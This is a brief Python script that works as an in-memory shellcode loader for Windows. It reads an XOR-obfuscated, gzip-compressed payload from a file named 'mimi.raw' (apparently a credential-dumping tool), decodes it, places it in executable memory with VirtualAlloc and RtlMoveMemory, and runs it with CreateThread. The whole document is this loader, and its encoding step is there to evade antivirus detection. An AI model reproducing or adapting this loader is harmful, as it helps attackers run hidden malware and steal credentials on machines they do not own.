import ctypes,gzip
from CoreCode.features import *

with open("mimi.raw","rb") as file:
    shellcode = Confuse_xor_file(file.read(),70)
    print(shellcode[0])
    shellcode = gzip.decompress(shellcode)
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(shellcode)),
        ctypes.c_int(0x3000),ctypes.c_int(0x40)
    )
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr),
        shellcode,
        ctypes.c_int(len(shellcode))
    )
    ht  = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_int(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(
        ctypes.c_int(ht ),
        ctypes.c_int(-1)
    )
